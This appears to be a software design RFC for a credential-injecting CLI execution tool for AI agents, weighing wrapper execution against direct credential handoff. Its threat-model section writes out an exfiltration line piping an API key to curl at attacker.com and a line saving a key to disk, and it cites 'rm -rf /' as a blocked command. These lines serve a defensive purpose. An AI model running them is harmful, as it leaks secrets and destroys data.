# RFC 0001: Secure CLI Execution

**Status:** Proposed  
**Author:** Janee Agent  
**Date:** 2026-02-04  
**Updated:** 2026-02-04 (refocused on wrapper execution)

## Summary

Add support for CLI tools that can't be proxied by having Janee execute commands with credentials injected via environment variables. The agent specifies the command to run but never sees the actual credential - preserving Janee's core security property while enabling CLI automation.

New MCP tool: `janee_exec(service, command)` - runs a command with credentials injected, returns stdout/stderr/exit code.

## Motivation

Janee's proxy model works great for HTTP APIs - agent never sees the real key, we enforce policies, everything's logged. But many CLI tools can't be proxied because they expect credentials via environment variables or config files.

**Example:** The `bird` Twitter CLI needs credentials to post tweets, search mentions, etc. Current options:
- Put credentials in `.env` files → no audit trail, no revocation, persists forever
- Ask the human every time → breaks agent autonomy
- Don't support CLI tools → huge gaps in automation capabilities

We need a way to enable CLI usage while preserving Janee's core security property: **agent never sees the key**.

**Solution:** Janee executes the command with credentials injected. Agent specifies what to run, sees the output, but the credential never enters the agent's context.

## Design

### Config Example

```yaml
services:
  twitter:
    baseURL: https://api.twitter.com
    encryptedKey: ...
    
capabilities:
  twitter_cli:
    service: twitter
    mode: exec  # New mode for CLI wrapper execution
    allowCommands: ["bird"]  # Whitelist of allowed executables
    env:
      TWITTER_API_KEY: "{{credential}}"  # Credential injected here
      TWITTER_USERNAME: "myhandle"  # Optional: static values
    workDir: "/tmp/janee-exec"  # Optional: working directory
```

### API Surface

New MCP tool: `janee_exec`

**Input:**
```json
{
  "service": "twitter",
  "capability": "twitter_cli",
  "command": ["bird", "tweet", "Hello from Janee!"],
  "stdin": null  // Optional: data to pipe to stdin
}
```

**Output:**
```json
{
  "stdout": "Tweet posted successfully (ID: 1234567890)\n",
  "stderr": "",
  "exitCode": 0,
  "executionTimeMs": 342
}
```

**Key property:** The credential never appears in the tool response. Agent sees command output, not the key.

### What Gets Logged

Every CLI execution creates an audit entry:

```json
{
  "timestamp": "2026-02-04T05:55:45Z",
  "type": "cli_execution",
  "service": "twitter",
  "capability": "twitter_cli",
  "command": ["bird", "tweet", "Hello from Janee!"],
  "exitCode": 0,
  "executionTimeMs": 342,
  "stdout": "Tweet posted successfully...",
  "stderr": ""
}
```

Note: The credential itself is **not logged**, only the command and its output.

### Command Whitelisting

The `allowCommands` config prevents agents from running arbitrary executables:

```yaml
allowCommands: ["bird"]  # Only bird is allowed
```

Attempting to run `rm -rf /` via `janee_exec` would fail with:
```json
{
  "error": "Command 'rm' not allowed by capability twitter_cli"
}
```

This prevents command injection attacks while still enabling legitimate CLI usage.

## Tradeoffs & Limitations

### Agent Never Sees the Credential

This approach preserves Janee's core security property. The credential is injected into the environment when executing the command, but never returned to the agent. Tool responses contain only stdout/stderr/exit code.

### Command Whitelisting Required

The `allowCommands` list must be carefully maintained. If an agent can run arbitrary commands with credentials in the environment, it could:
- Exfiltrate credentials via `echo $TWITTER_API_KEY | curl attacker.com`
- Persist credentials to disk via `echo $TWITTER_API_KEY > ~/.leaked`

Whitelisting prevents this, but requires knowing which executables are safe. For most CLIs (bird, gh, stripe-cli, etc.), this is straightforward.

### CLIs That Persist Credentials

Some CLIs write credentials to config files on first use:
- `bird config --api-key $TWITTER_API_KEY` might write to `~/.birdrc`
- Subsequent runs read from that file

This is equivalent risk to the CLI having the credential in the first place. We can mitigate by:
- Using temp config directories per execution
- Clearing config files after execution
- Accepting it as necessary for CLI functionality

### No Interactive Prompts (Yet)

Initial implementation won't support CLIs that need interactive input (password prompts, confirmations). Future work could add stdin piping for this.

### Out of Scope: Browser Authentication

Browser login flows (OAuth, social login, etc.) are **out of scope** for this RFC. The recommended approach is:
- Human logs into the browser manually
- Session persists via cookies
- Agent uses pre-authenticated browser session for automation

Janee doesn't need to manage browser credentials - the browser already has a session management system.

### When to Use Handoff vs Proxy

Use **proxy mode** when:
- Tool uses HTTP APIs
- Requests can be policy-gated
- Agent doesn't need raw credential

Use **handoff mode** when:
- CLI requires credential in config/env
- Browser login flow needs manual entry
- Native SDK won't work with custom HTTP client
- OAuth flow needs client secret

If you can proxy it, proxy it. Handoff is for cases where proxy isn't feasible.

### Trust Model Shift

- **Proxy mode**: "Agent can only do what policies allow"
- **Handoff mode**: "Agent can do anything, but we know when/why"

This is a **lower security tier**. Services that allow handoff should be considered "agent has full access" even if policies say otherwise.

## Alternatives Considered

### 1. Direct Credential Handoff (Rejected)

Agent requests the actual credential, receives it as a tool response:

```json
// Agent calls:
janee_request_credential(service="twitter")

// Returns:
{
  "credential": "xoxb-actual-key-here",
  "instructions": "Don't persist or share this"
}
```

**Why rejected:**
- **Breaks core security property** - agent sees the key
- **Credentials in logs** - tool responses end up in transcripts, debug logs, framework logs
- **Expiration is ornamental** - once key is in context, "expiration" doesn't revoke access
- **Not actually useful** - it's just throwing credentials into the agent's context with "please be good" instructions

This approach offers no real security benefit over `.env` files. The wrapper execution approach is strictly better - agent never sees key, no credentials in logs, actual enforcement.

### 2. Environment Injection (Hybrid Approach)

Tell the agent credentials are available in env, but don't return them as tool results:

```bash
# Agent calls:
janee_prepare_env(service="twitter")

# Tool returns:
{ "ready": true, "envVars": ["TWITTER_API_KEY"] }

# Agent runs command knowing env is set:
exec(command="bird tweet 'hello'", env=process.env)
```

**Problem:** Agent's exec environment must be Janee-controlled. Doesn't work with agent frameworks that sandbox exec separately.

### 3. One-Time Fetch URL

Return a localhost URL the CLI can fetch directly:

```bash
# Tool returns:
{ "credentialUrl": "http://localhost:9999/fetch/abc123" }

# Agent configures CLI:
bird config --api-key-url http://localhost:9999/fetch/abc123
```

**Problem:** Most CLIs don't support fetching keys from URLs. Would need to build a wrapper script per CLI. Wrapper execution is simpler and more general.

### 4. Just use `.env` files

**Problem:** No audit trail, no revocation, no expiration, credentials persist across sessions. We'd be building a secrets manager that doesn't manage secrets.

### 5. Build a credential proxy that intercepts CLI config files

**Problem:** Every CLI has different config formats. Unmaintainable. Also very fragile (what if CLI updates its config schema?).

### 6. Don't support these tools at all

**Problem:** Leaves huge gaps in agent capabilities. Twitter automation is a common use case, can't just ignore it.

## Implementation Plan

### Phase 1: Wrapper Execution (MVP)
- [ ] Add `mode: exec` to capability config
- [ ] Implement `janee_exec` MCP tool
  - Takes: service, command (array), optional stdin
  - Returns: stdout, stderr, exit code
- [ ] Environment variable templating (`{{credential}}`)
- [ ] Command whitelisting (`allowCommands`)
- [ ] Audit logging (command + service, not the key)
- [ ] Test with Twitter `bird` CLI

### Phase 2: Advanced Wrapper Features
- [ ] Interactive command support (stdin/stdout piping)
- [ ] Temp config directory isolation
- [ ] Working directory control
- [ ] Timeout handling
- [ ] Process isolation (prevent env leakage)

### Phase 3: Direct Handoff (if needed)
- [ ] Add `mode: handoff` to capability config
- [ ] Implement `janee_request_credential` MCP tool
- [ ] Session tracking in `~/.janee/handoff-sessions.json`
- [ ] Audit logging with credentials-in-logs warnings
- [ ] Optional approval flow (`requiresApproval: true`)

Decision point: Only build Phase 3 if Phase 1/2 prove insufficient for real use cases.

## Decision: Handoff vs Wrapper Execution?

### The Core Question

Should we break Janee's fundamental security property ("agent never sees key") to support CLIs?

**Direct handoff says:** Yes, for tools that require it. Accept the tradeoff, add guardrails (audit, instructions, expiration).

**Wrapper execution says:** No. Keep the property intact by having Janee run the command instead of the agent.

### Recommendation: Start with Wrapper Execution

Prototype the wrapper approach first because:
1. **Preserves core security property** - agent never sees key
2. **Solves credentials-in-logs problem** - tool response is stdout, not credential
3. **Works for majority of CLIs** - most read from env vars
4. **Falls back naturally** - if wrapper doesn't work for a tool, we can add handoff later

If wrapper execution proves insufficient (e.g., browser automation, interactive CLIs with unusual requirements), then consider adding direct handoff as a **higher-risk tier**.

## Open Questions

### For Wrapper Execution:

1. **How do we handle CLIs that write credentials to config files?**
   - Example: `bird` might persist key to `~/.birdrc`
   - Options: Intercept config writes, use temp config dirs, or accept it as equivalent risk to handoff

2. **Should we support interactive commands (stdin/stdout)?**
   - Example: `git push` prompting for credentials
   - Need to pipe stdin/stdout carefully

3. **How do we prevent env leakage to child processes?**
   - Clear env after command completes
   - Use isolated process spawning

### For Direct Handoff (if we build it):

4. **Should we inject instructions into the agent's prompt or just include them in the response?**
   - Prompt injection is more reliable (agent sees it before using key)
   - Response-only is simpler (no framework integration needed)

5. **Should handoff sessions be capability-scoped or service-scoped?**
   - Capability-scoped: more granular, agent specifies intent
   - Service-scoped: simpler, one session per service

6. **Should we support key rotation during active handoff sessions?**
   - Useful for long-running sessions
   - Adds complexity (agent needs to handle credential updates)

## Success Metrics

### For Wrapper Execution:
- Twitter automation works via `janee_exec(service="twitter", command=["bird", "tweet", "..."])`
- Agent never sees credentials (verified by inspecting tool responses)
- No credentials in session transcripts or debug logs
- Commands execute successfully with proper env injection
- Audit logs show command execution without exposing keys

### For Direct Handoff (if built):
- Agent can request credentials when wrapper won't work
- Audit logs show when/why credentials were handed off
- Credentials appear in tool responses (accept this tradeoff)
- Instructions injected successfully (LLM acknowledges them)

---

**Next Steps:** Prototype wrapper execution (Phase 1) and test with Twitter CLI use case. Validate that "agent never sees key" property holds.
